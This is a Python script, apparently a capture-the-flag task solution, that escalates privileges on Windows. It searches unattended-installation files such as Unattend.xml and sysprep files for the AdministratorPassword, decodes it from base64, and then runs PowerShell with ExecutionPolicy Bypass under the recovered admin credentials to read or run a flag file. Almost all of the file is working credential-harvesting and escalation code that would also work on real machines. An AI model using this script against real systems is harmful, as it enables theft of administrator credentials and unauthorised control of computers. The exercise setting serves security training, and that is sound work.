#!/usr/bin/env python3
"""
Windows Privilege Escalation - Task 0
Extract sensitive data from unattended installation files.
This script:
1. Scans common file locations for unattended installation files
2. Extracts the AdministratorPassword using regular expressions
3. Decodes the base64-encoded password
4. Uses runas to establish an administrative session to retrieve the flag
"""
import os
import re
import base64
import subprocess
import sys
# Step 1 — Typical file locations to scan
UNATTEND_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\Panther\unattend\Unattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\sysprep.xml",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\Unattend.xml",
    r"C:\autounattend.xml",
]
def scan_for_files():
    """
    Scans the system for unattended installation files
    in known default locations.
    Returns a list of existing file paths.
    """
    found = []
    for path in UNATTEND_PATHS:
        if os.path.isfile(path):
            print(f"[+] Found: {path}")
            found.append(path)
        else:
            print(f"[-] Not found: {path}")
    return found
# Step 2 — Password extraction using regex
def extract_password(file_path):
    """
    Reads the unattended file and uses a regular expression
    to extract the <AdministratorPassword><Value>...</Value> field.
    Also extracts <PlainText> flag and AutoLogon username.
    Returns a tuple: (encoded_password, is_plaintext, username)
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        # Regex to extract AdministratorPassword Value
        pwd_pattern = (
            r"<AdministratorPassword>\s*"
            r"<Value>(.*?)</Value>\s*"
            r"<PlainText>(.*?)</PlainText>"
        )
        match = re.search(pwd_pattern, content, re.DOTALL | re.IGNORECASE)
        # Also extract AutoLogon username
        user_pattern = r"<AutoLogon>.*?<Username>(.*?)</Username>"
        user_match = re.search(user_pattern, content, re.DOTALL | re.IGNORECASE)
        username = user_match.group(1).strip() if user_match else "Administrator"
        if match:
            encoded_value = match.group(1).strip()
            is_plaintext = match.group(2).strip().lower() == "true"
            print(f"[+] Password value extracted from: {file_path}")
            print(f"    Encoded value : {encoded_value}")
            print(f"    PlainText flag: {is_plaintext}")
            print(f"    AutoLogon user: {username}")
            return encoded_value, is_plaintext, username
        print(f"[-] No AdministratorPassword found in {file_path}")
        return None, None, None
    except Exception as e:
        print(f"[!] Error reading {file_path}: {e}")
        return None, None, None
# Step 3 — Decoding the password
def decode_password(encoded_value, is_plaintext):
    """
    Decodes the extracted password.
    - If PlainText is true: base64 decode with UTF-8
    - If PlainText is false: base64 decode with UTF-16LE
      and strip the 'AdministratorPassword' suffix
    """
    try:
        # Ensure proper base64 padding
        padded = encoded_value + "=" * (4 - len(encoded_value) % 4)
        raw_bytes = base64.b64decode(padded)
        if is_plaintext:
            # PlainText=true: password is base64-encoded UTF-8
            password = raw_bytes.decode("utf-8")
            print(f"[+] Decoded (UTF-8 plaintext): {password}")
        else:
            # PlainText=false: base64(UTF-16LE(password + suffix))
            decoded = raw_bytes.decode("utf-16-le")
            suffix = "AdministratorPassword"
            if decoded.endswith(suffix):
                password = decoded[: -len(suffix)]
            else:
                password = decoded
            print(f"[+] Decoded (UTF-16LE stripped): {password}")
        return password
    except Exception as e:
        print(f"[!] Decoding error: {e}")
        return None
# Step 4 — Establishing admin session via runas
def get_flag(username, password):
    """
    Uses runas to establish an administrative session
    with the extracted credentials, then reads the flag
    from the admin user's Desktop.
    """
    flag_locations = [
        rf"C:\Users\{username}\Desktop\flag.txt",
        rf"C:\Users\{username}\Desktop\flag.exe",
        r"C:\Users\Administrator\Desktop\flag.txt",
        r"C:\Users\Administrator\Desktop\flag.exe",
    ]
    print(f"\n[*] Attempting to access flag as: {username}")
    print(f"[*] Password: {password}")
    for flag_path in flag_locations:
        if not os.path.exists(os.path.dirname(flag_path)):
            continue
        print(f"[*] Trying: {flag_path}")
        if flag_path.endswith(".exe"):
            # For .exe flag files, run them via runas
            ps_cmd = (
                f'$pw = ConvertTo-SecureString "{password}" -AsPlainText -Force; '
                f'$cred = New-Object System.Management.Automation.PSCredential '
                f'("{username}", $pw); '
                f'Start-Process "{flag_path}" -Credential $cred -Wait'
            )
        else:
            # For .txt flag files, read them via runas
            ps_cmd = (
                f'$pw = ConvertTo-SecureString "{password}" -AsPlainText -Force; '
                f'$cred = New-Object System.Management.Automation.PSCredential '
                f'("{username}", $pw); '
                f'Start-Process cmd -ArgumentList \'/c type "{flag_path}"\' '
                f'-Credential $cred -NoNewWindow -Wait '
                f'-RedirectStandardOutput "C:\\Users\\Public\\flag_out.txt"; '
                f'Get-Content "C:\\Users\\Public\\flag_out.txt"'
            )
        try:
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if result.stdout.strip():
                flag = result.stdout.strip()
                print(f"\n{'='*50}")
                print(f"  FLAG: {flag}")
                print(f"{'='*50}\n")
                return flag
        except Exception as e:
            print(f"[!] {e}")
    # Provide manual instructions as fallback
    print(f"\n[*] Manual steps to retrieve the flag:")
    print(f'    1. Run: runas /user:{username} cmd')
    print(f"    2. Enter password: {password}")
    print(f"    3. In the new window, run: flag.exe")
    return None
def main():
    """Main execution flow for privilege escalation via unattended files."""
    print("=" * 60)
    print("  Windows Privilege Escalation — Unattended File Extraction")
    print("=" * 60)
    # Step 1: Scan for unattended files
    print("\n[*] STEP 1: Scanning for unattended installation files...\n")
    found_files = scan_for_files()
    if not found_files:
        print("[!] No unattended files found.")
        sys.exit(1)
    # Step 2: Extract encoded password
    print("\n[*] STEP 2: Extracting password from files...\n")
    encoded_value, is_plaintext, username = None, None, None
    for fpath in found_files:
        encoded_value, is_plaintext, username = extract_password(fpath)
        if encoded_value:
            break
    if not encoded_value:
        print("[!] No password could be extracted.")
        sys.exit(1)
    # Step 3: Decode password
    print("\n[*] STEP 3: Decoding password...\n")
    password = decode_password(encoded_value, is_plaintext)
    if not password:
        print("[!] Decoding failed.")
        sys.exit(1)
    # Step 4: Retrieve the flag via runas
    print("\n[*] STEP 4: Establishing admin session to retrieve flag...\n")
    flag = get_flag(username, password)
    if flag:
        with open("0-flag.txt", "w") as f:
            f.write(flag + "\n")
        print(f"[+] Flag saved to 0-flag.txt")
if __name__ == "__main__":
    main()
